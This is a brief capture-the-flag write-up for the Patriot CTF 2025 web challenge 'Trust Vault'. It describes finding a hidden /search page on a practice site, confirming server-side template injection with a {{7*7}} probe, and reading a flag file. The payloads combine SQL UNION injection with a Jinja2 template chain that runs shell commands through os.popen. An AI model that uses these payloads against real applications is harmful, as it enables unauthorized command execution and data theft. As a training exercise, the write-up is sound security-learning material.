# Trust Vault — Patriot CTF 2025

> **Room / Challenge:** Trust Vault (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** Patriot CTF 2025
- **Challenge:** Trust Vault (web)
- **Date:** `24-11-2025`

---

## Goal

This website is vulnerable to SSTI, leveraging this to get the flag.

## My Solution

Create an account and logged in we can find 3 paths: `/bookmarks`, `/audit`, `/reports`. Inspecting the source of these 3 pages we can find a hidden page `/search`. In this page, there is a search input, tried a simple SSTI payloads:

```
{{7*7}}
```

Got `49`, therefore we know SSTI can be used in this challenge:

```
' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}" --
```

Found a file `flag-e1aadb58a27f03a274f54d2883bce54b.txt`, run payload:

```
' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag-e1aadb58a27f03a274f54d2883bce54b.txt').read() }}" --
```

By this we can get the flag.
